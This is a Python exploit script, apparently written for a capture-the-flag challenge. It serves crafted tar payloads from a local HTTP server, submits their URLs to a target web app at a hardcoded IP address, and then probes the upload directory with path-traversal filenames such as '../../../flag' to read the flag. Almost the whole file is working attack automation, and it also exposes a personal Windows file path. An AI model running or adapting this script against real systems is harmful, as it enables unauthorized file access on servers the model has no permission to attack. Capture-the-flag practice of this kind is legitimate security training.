#!/usr/bin/env python3
"""Test all tar payloads against the target and extract the flag."""
import http.server
import socketserver
import threading
import time
import requests
import os
import subprocess

TARGET_URL = "http://89.144.35.159:1337/"
LOCAL_PORT = 9999

class QuietHTTPHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # Suppress logs

def start_server():
    """Start a simple HTTP server in the background."""
    os.chdir(r"C:\Users\Alexandru Moga\Documents\first-gooogot-game\explo")
    handler = QuietHTTPHandler
    httpd = socketserver.TCPServer(("", LOCAL_PORT), handler)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    print(f"[+] HTTP server started on port {LOCAL_PORT}")
    return httpd

def test_payload(tar_file, httpd_url):
    """POST a tar file URL to the target and check for flag extraction."""
    payload_url = f"{httpd_url}/{tar_file}"
    print(f"\n[*] Testing: {tar_file}")
    print(f"    Payload URL: {payload_url}")
    
    try:
        # POST the URL to the target
        response = requests.post(TARGET_URL, data={"url": payload_url}, timeout=10)
        
        # Extract the upload directory from response
        if "uploads/" in response.text:
            # Find the unique upload directory
            import re
            match = re.search(r'uploads/([a-f0-9]+)', response.text)
            if match:
                upload_dir = match.group(1)
                print(f"    Upload dir: uploads/{upload_dir}")
                
                # Try to fetch common filenames
                test_files = [
                    "flag", "getflag", "flag.shtml", 
                    "../../../flag", "../../../../../../flag",
                    "flag.txt", "../../../flag.txt"
                ]
                
                for filename in test_files:
                    try:
                        file_url = f"{TARGET_URL}uploads/{upload_dir}/{filename}"
                        file_resp = requests.get(file_url, timeout=5)
                        
                        if file_resp.status_code == 200 and "CTF{" in file_resp.text:
                            print(f"\n{'='*60}")
                            print(f"[!] FLAG FOUND at {filename}!")
                            print(f"{'='*60}")
                            print(f"URL: {file_url}")
                            print(f"Content:\n{file_resp.text}")
                            print(f"{'='*60}\n")
                            return True
                        elif file_resp.status_code == 200:
                            print(f"    ✓ {filename}: {len(file_resp.text)} bytes (no flag pattern)")
                    except:
                        pass
                
                print(f"    ✗ No flag found in common locations")
            else:
                print(f"    ✗ Could not extract upload directory")
        else:
            print(f"    ✗ No upload directory in response")
            
    except Exception as e:
        print(f"    ✗ Error: {e}")
    
    return False

def main():
    """Run all payload tests."""
    # Get local IP for the HTTP server
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
    except:
        local_ip = "localhost"
    finally:
        s.close()
    
    httpd_url = f"http://{local_ip}:{LOCAL_PORT}"
    
    print(f"Starting exploit tester...")
    print(f"Target: {TARGET_URL}")
    print(f"Local server: {httpd_url}")
    
    # Start HTTP server
    httpd = start_server()
    time.sleep(1)  # Give server time to start
    
    # Get all tar files
    tar_files = [f for f in os.listdir(".") if f.endswith(".tar")]
    
    print(f"\nFound {len(tar_files)} tar payloads to test\n")
    
    # Test each payload
    for tar_file in tar_files:
        if test_payload(tar_file, httpd_url):
            print("\n[!] FLAG EXTRACTED SUCCESSFULLY!")
            break
        time.sleep(0.5)  # Small delay between requests
    
    print("\n[+] Testing complete")
    httpd.shutdown()

if __name__ == "__main__":
    main()
